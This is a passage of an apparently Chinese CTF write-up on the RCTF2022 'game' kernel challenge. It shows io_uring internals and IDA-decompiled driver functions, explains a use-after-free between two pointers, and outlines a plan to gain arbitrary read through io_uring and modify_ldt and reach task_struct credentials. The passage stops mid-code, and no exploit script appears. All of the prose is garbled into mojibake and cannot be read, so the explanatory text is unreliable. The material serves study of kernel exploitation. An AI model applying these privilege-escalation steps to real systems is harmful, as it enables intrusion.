class="line">&#125;</span><br><span class="line">ctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;</span><br><span class="line">needs_switch = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;user_bufs[i] = imu;</span><br><span class="line">*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_switch)</span><br><span class="line">io_rsrc_node_switch(ctx, ctx-&gt;buf_data);</span><br><span class="line"><span class="keyword">return</span> done ? done : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œæ›´æ–°æ–¹å¼ä¹Ÿå¾ˆç‹¬æ ‘ä¸€å¸œï¼Œå¹¶ä¸æ˜¯ç®€å•çš„<code>copy_from_user</code>ä¹‹ç±»çš„ï¼Œè€Œæ˜¯å…«ä¸ªå­—èŠ‚å…«ä¸ªå­—èŠ‚çš„å†™ã€‚</p><h4 id="é‡Šæ”¾object"><a href="#é‡Šæ”¾object" class="headerlink" title="é‡Šæ”¾object"></a>é‡Šæ”¾object</h4><p>è°ƒç”¨<code>io_uring_unregister_buffers</code>å‡½æ•°å³å¯å¯¹æ‰€æœ‰objectè¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_unregister_buffers</span><span class="params">(struct io_uring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_UNREGISTER_BUFFERS, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">io_free_page_table</span><span class="params">(<span class="keyword">void</span> **table, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++)</span><br><span class="line">kfree(table[i]);</span><br><span class="line">kfree(table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯ä¸Šé¢è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå…¶ä¸­tableçš„å«ä¹‰è·Ÿåˆ†é…æ—¶ä¸€è‡´ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>é€šè¿‡ä¸Šé¢ä¸‰ä¸ªæ–¹å‘çš„åˆ†æï¼Œå„ä½å¤§ä½¬åº”è¯¥èƒ½æƒ³åˆ°IO_uringåœ¨å¾ˆå¤šæ–¹é¢éƒ½å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œä¸è¿‡ä»–çš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä»–æ— æ³•è¯»å–å †å—ä¸Šçš„å†…å®¹(å¯èƒ½æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼Œæ‰¾åˆ°çš„ä½¬å¯ä»¥ç•™è¨€ä¸€ä¸‹)ã€‚</p><h2 id="RCTF2022-game"><a href="#RCTF2022-game" class="headerlink" title="RCTF2022 game"></a>RCTF2022 game</h2><p>ç°åœ¨å¼€å§‹é¢˜ç›®åˆ†æï¼Œå‡ºé¢˜äººå¸ˆå‚…æ˜¯ç»™äº†æºä»£ç çš„ï¼Œä½†æ˜¯é€šè¿‡idaé€†å‘å¹¶ä¸å›°éš¾ï¼Œæ‰€ä»¥ä¸‹é¢è¿˜æ˜¯ç»™idaä¸­çš„ä»£ç </p><h3 id="é©±åŠ¨åˆ†æ"><a href="#é©±åŠ¨åˆ†æ" class="headerlink" title="é©±åŠ¨åˆ†æ"></a>é©±åŠ¨åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hhoge_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  __int64 v8; <span class="comment">// r15</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  Maind *maind_chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 new_chunk; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *username; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD v15[<span class="number">5</span>]; <span class="comment">// [rsp-58h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v21 = v4;</span><br><span class="line">  v20 = v8;</span><br><span class="line">  v19 = v7;</span><br><span class="line">  v18 = v6;</span><br><span class="line">  v17 = v5;</span><br><span class="line">  v16 = v3;</span><br><span class="line">  maind_chunk = *(Maind **)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v15[<span class="number">4</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( maind_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(v15, v9, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      change(maind_chunk, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        hhoge_unlocked_ioctl_cold();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">            reborn_0(maind_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printk(<span class="string">&quot;born&quot;</span>);</span><br><span class="line">          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">          username = maind_chunk-&gt;username;</span><br><span class="line">          v13 = <span class="number">8LL</span>;</span><br><span class="line">          v14 = v15;</span><br><span class="line">          maind_chunk-&gt;cur = (<span class="keyword">void</span> *)new_chunk;</span><br><span class="line">          *(_QWORD *)(new_chunk + <span class="number">8</span>) = <span class="string">&quot;ordinary&quot;</span>;</span><br><span class="line">          maind_chunk-&gt;id = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v13 )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_DWORD *)username = *v14++;</span><br><span class="line">            username += <span class="number">4</span>;</span><br><span class="line">            --v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ioctlä¸­åˆ†ä¸ºäº†å››ç±»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">reborn_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *cur; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rdi</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;reborn&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  v4 = <span class="number">6LL</span>;</span><br><span class="line">  context-&gt;prv = v2;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  v6 = cur;</span><br><span class="line">  <span class="keyword">while</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5++ = *v6++;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_QWORD *)cur + <span class="number">1</span>) = <span class="string">&quot;unlucky&quot;</span>;</span><br><span class="line">  *((_QWORD *)context-&gt;cur + <span class="number">2</span>) = <span class="number">0xFFFFFFFFFFFE40AE</span>LL;</span><br><span class="line">  ++context-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>reborn_0</code>å‡½æ•°å¹¶æ²¡æœ‰å°†æ–°åˆ†é…çš„objectç»™åˆ°curæŒ‡é’ˆä¸­ï¼Œè€Œæ˜¯ç»™åˆ°äº†<code>context-&gt;prv</code>ä¸­å»äº†ã€‚å¹¶ä¸”ä¼šæŠŠ<code>context-&gt;cur[0]</code>çš„å†…å®¹å¤åˆ¶åˆ°<code>context-&gt;prv[0]</code>ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change_cold</span><span class="params">(Maind *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// kr08_8</span></span><br><span class="line">  _QWORD *cur; <span class="comment">// r13</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  printk(<span class="string">&quot;change&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strsep((<span class="keyword">char</span> **)(v1 - <span class="number">0x38</span>), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      v5 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">LABEL_24:</span><br><span class="line">        JUMPOUT(<span class="number">0x132</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !*v4 );</span><br><span class="line">    v6 = <span class="built_in">strchr</span>(v4, <span class="number">0x3D</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="built_in">strlen</span>(v6 + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 - <span class="number">1</span> &lt;= <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cur = a1-&gt;cur;</span><br><span class="line">        <span class="keyword">if</span> ( !cur )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = kmemdup_nul(v6 + <span class="number">1</span>, v7 - <span class="number">1</span>, <span class="number">0xCC0</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        v9 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = key_list[v9];</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          *(_DWORD *)(v1 - <span class="number">0x3C</span>) = v9++;</span><br><span class="line">          v11 = <span class="built_in">strcmp</span>(v10, v5);</span><br><span class="line">          v12 = *(_DWORD *)(v1 - <span class="number">0x3C</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v11 );</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cur[<span class="number">2</span>] += v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v12 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">              cur[<span class="number">1</span>] = <span class="string">&quot;lucky&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            kfree(*cur);</span><br><span class="line">            *cur = v2;</span><br><span class="line">            v2 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">        kfree(v2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cur = a1-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( !cur )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯<code>change</code>å‡½æ•°ï¼Œè¿™é“é¢˜å”¯ä¸€éš¾é€†å‘çš„åœ°æ–¹å°±åœ¨è¿™é‡Œï¼Œä»”ç»†çœ‹å…¶å®ä¹ŸæŒºç®€å•çš„ï¼Œå°±æ˜¯è¿›è¡Œå­—ç¬¦ä¸²å¯¹æ¯”ç„¶åè¿›å…¥ç›¸åº”çš„åˆ†å€¼ï¼Œå…¶ä¸­<code>kmemdup_nul</code>å‡½æ•°ä¼šåˆ†é…ä¸€ä¸ªå †å—ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯é¦–å…ˆ<code>kfree</code>æ‰å½“å‰<code>context-&gt;cur[0]</code>ç„¶åå°†æ–°åˆ†é…çš„å †å—æ”¾è¿›å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delMaind_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *cur; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *prv; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;die\n&quot;</span>);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  prv = context-&gt;prv;</span><br><span class="line">  <span class="keyword">if</span> ( cur )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*cur);</span><br><span class="line">    *cur = <span class="number">0LL</span>;</span><br><span class="line">    kfree(cur);</span><br><span class="line">    context-&gt;cur = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prv )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*prv);</span><br><span class="line">    *prv = <span class="number">0LL</span>;</span><br><span class="line">    kfree(prv);</span><br><span class="line">    context-&gt;prv = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¹Ÿå°±æ˜¯<code>hhoge_unlocked_ioctl_cold</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼š<code>kfree</code>æ‰çš„ä¸œè¥¿å¾ˆå¤šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hhoge_read</span><span class="params">(file *file, <span class="keyword">char</span> *ubuf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  Maind *private_data; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  private_data = (Maind *)file-&gt;private_data;</span><br><span class="line">  <span class="keyword">if</span> ( !private_data )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = private_data-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">      v7 = v4;</span><br><span class="line">    _check_object_size(private_data-&gt;cur, v7, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(ubuf, v6, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯readå‡½æ•°ï¼Œæœ€å¤šåªå…è®¸è¯»å–9ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚å¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–åˆ°å †åœ°å€ã€‚</p><p>é¢˜ç›®çš„æ¼æ´å¾ˆæ˜æ˜¾ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>change_cold</code>å‡½æ•°åˆ†é…ä¸€ä¸ªå †å—ï¼Œé‚£ä¹ˆæ­¤æ—¶è¿™ä¸ªå †å—çš„åœ°å€åœ¨<code>context-&gt;cur[0]</code>ä¸­éšåè°ƒç”¨<code>reborn_0</code>å‡½æ•°ï¼Œé‚£ä¹ˆå †å—åœ°å€åœ¨<code>context-&gt;prv[0]</code>ä¸­ä¹Ÿå­˜åœ¨äº†ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å†æ¬¡è°ƒç”¨<code>change_cold</code>å‡½æ•°çš„è¯ï¼Œå°±ä¼š<code>kfree</code>è°ƒç”¨<code>context-&gt;cur[0]</code>ä¸­çš„å †å—ï¼Œä½†æ˜¯æ­¤æ—¶<code>context-&gt;prv[0]</code>æŒ‡é’ˆä»ç„¶ä¿å­˜ç€ç›®æ ‡å †å—çš„åœ°å€ï¼Œæ­¤æ—¶å°±å½¢æˆäº†UAFã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>çŸ¥é“äº†io_uringä»¥åŠä¸Šé¢çš„æ¼æ´çš„è¯åˆ©ç”¨æ–¹å¼å°±å¾ˆæ˜æ˜¾äº†ï¼Œè¿™é‡Œå¯ä»¥é¦–å…ˆåˆ©ç”¨io_uringå¯ä»¥éšæ„æ›´æ–°å†…å®¹çš„æœºåˆ¶ä»¥åŠreadå¯ä»¥æ³„æ¼å‡ºå †åœ°å€é…åˆ<code>modify_ldt</code>å®ç°ä»»æ„åœ°å€è¯»ï¼Œåœ¨å †åŒºä¸­å¯»åœ¨<code>task_struct</code>ç»“æ„ä½“ï¼Œè¿›è€Œè·å¾—<code>cred</code>åœ°å€ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ–°ç‰ˆæœ¬<code>task_struct</code>åœ¨è¿™ä¸€ç‰‡åŒºåŸŸæœ‰ä¸€ç‚¹å°å˜åŒ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 